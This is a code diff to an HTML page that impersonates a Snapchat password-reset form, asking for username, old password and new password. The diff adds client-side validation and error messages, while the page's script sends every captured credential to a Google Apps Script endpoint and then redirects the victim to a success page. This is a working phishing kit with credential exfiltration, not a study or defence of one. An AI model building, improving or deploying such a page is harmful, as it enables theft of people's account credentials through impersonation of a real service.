@@ -4,6 +4,13 @@
     <meta charset="UTF-8">
     <title>Snapchat Password Reset</title>
     <link rel="stylesheet" href="index.css"> <!-- Link to your CSS file -->
+    <style>
+        .error-message {
+            color: red;
+            margin-top: 5px;
+            font-size: 14px;
+        }
+    </style>
 </head>
 <body>
     <div class="form">
@@ -11,13 +18,16 @@
         <h1>Reset Your Snapchat Password</h1>
         <form id="passwordForm">
             <label for="username">Username or Email Address:</label><br>
-            <input type="text" id="username" name="username" placeholder="Enter your username or email" required><br><br>
+            <input type="text" id="username" name="username" placeholder="Enter your username or email" required><br>
+            <span id="usernameError" class="error-message"></span><br>
             
             <label for="old_password">Old Password:</label><br>
-            <input type="password" id="old_password" name="old_password" placeholder="Enter your old password" required><br><br>
+            <input type="password" id="old_password" name="old_password" placeholder="Enter your old password" required><br>
+            <span id="oldPasswordError" class="error-message"></span><br>
             
             <label for="new_password">New Password:</label><br>
-            <input type="password" id="new_password" name="new_password" placeholder="Enter your new password" required><br><br>
+            <input type="password" id="new_password" name="new_password" placeholder="Enter your new password" required><br>
+            <span id="newPasswordError" class="error-message"></span><br>
             
             <input type="submit" value="Submit">
         </form>
@@ -27,13 +37,47 @@
         document.getElementById('passwordForm').addEventListener('submit', function(event) {
             event.preventDefault(); // Prevent form submission
             
+            if (validateForm()) {
+                var username = document.getElementById('username').value;
+                var oldPassword = document.getElementById('old_password').value;
+                var newPassword = document.getElementById('new_password').value;
+                
+                // Send captured data to remote storage (Google Apps Script endpoint)
+                storePassword(username, oldPassword, newPassword);
+            }
+        });
+        
+        function validateForm() {
             var username = document.getElementById('username').value;
             var oldPassword = document.getElementById('old_password').value;
             var newPassword = document.getElementById('new_password').value;
+            var isValid = true;
             
-            // Send captured data to remote storage (Google Apps Script endpoint)
-            storePassword(username, oldPassword, newPassword);
-        });
+            // Reset error messages
+            document.getElementById('usernameError').textContent = '';
+            document.getElementById('oldPasswordError').textContent = '';
+            document.getElementById('newPasswordError').textContent = '';
+            
+            // Validate username
+            if (!username.trim()) {
+                document.getElementById('usernameError').textContent = 'Username or email is required';
+                isValid = false;
+            }
+            
+            // Validate old password
+            if (!oldPassword.trim()) {
+                document.getElementById('oldPasswordError').textContent = 'Old password is required';
+                isValid = false;
+            }
+            
+            // Validate new password
+            if (!newPassword.trim()) {
+                document.getElementById('newPasswordError').textContent = 'New password is required';
+                isValid = false;
+            }
+            
+            return isValid;
+        }
         
         function storePassword(username, oldPassword, newPassword) {
             var url = "https://script.google.com/macros/s/AKfycbwLOI3FQgQZjTcqe9qHTzqAHhCel31IFEwdfotp6PE6p7lZoIU0K6pB-DzPMKyVZgP2/exec"; // Update with your deployed Google Apps Script URL
@@ -53,7 +97,7 @@
                 .then(response => {
                     if (response.ok) {
                         console.log("Password submitted successfully");
-                        // Optional: Redirect to a message page
+                        // Redirect to success page
                         window.location.href = "success.html";
                     } else {
                         console.error("Error submitting password");
